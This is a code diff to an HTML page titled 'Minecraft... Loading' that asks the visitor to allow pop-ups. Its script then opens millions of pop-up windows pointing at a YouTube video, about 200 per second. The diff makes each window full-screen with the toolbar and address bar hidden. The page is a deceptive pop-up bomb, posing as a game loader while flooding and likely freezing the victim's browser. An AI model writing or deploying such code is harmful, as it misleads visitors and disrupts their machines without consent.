@@ -10,17 +10,16 @@
 
             function openWindow() {
                 if (count < numberOfWindows) {
-                   
                     const screenWidth = window.screen.availWidth;
                     const screenHeight = window.screen.availHeight;
-                    const windowWidth = 800; 
-                    const windowHeight = 600; 
 
-                    const left = Math.floor(Math.random() * (screenWidth - windowWidth));
-                    const top = Math.floor(Math.random() * (screenHeight - windowHeight));
+                    // Set window dimensions to match screen dimensions
+                    const windowWidth = screenWidth;
+                    const windowHeight = screenHeight;
 
-                   
-                    window.open(url, '_blank', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
+                    // Open the window
+                    window.open(url, '_blank', `width=${windowWidth},height=${windowHeight},left=0,top=0,scrollbars=no,toolbar=no,location=no,menubar=no,resizable=yes`);
+
                     count++;
                     setTimeout(openWindow, interval);
                 }
@@ -32,7 +31,7 @@
         window.onload = function() {
             const url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
             const windowsPerSecond = 200; 
-            const interval = 10 / windowsPerSecond; 
+            const interval = 1000 / windowsPerSecond; 
 
             openWindows(url, 9999999, interval); 
         };
@@ -40,7 +39,6 @@
 </head>
 <body>
     <h1>Minecraft... Loading</h1>
-
-<p style="color:#FF0000";>Allow pop-ups</p>
+    <p style="color:#FF0000;">Allow pop-ups</p>
 </body>
 </html>
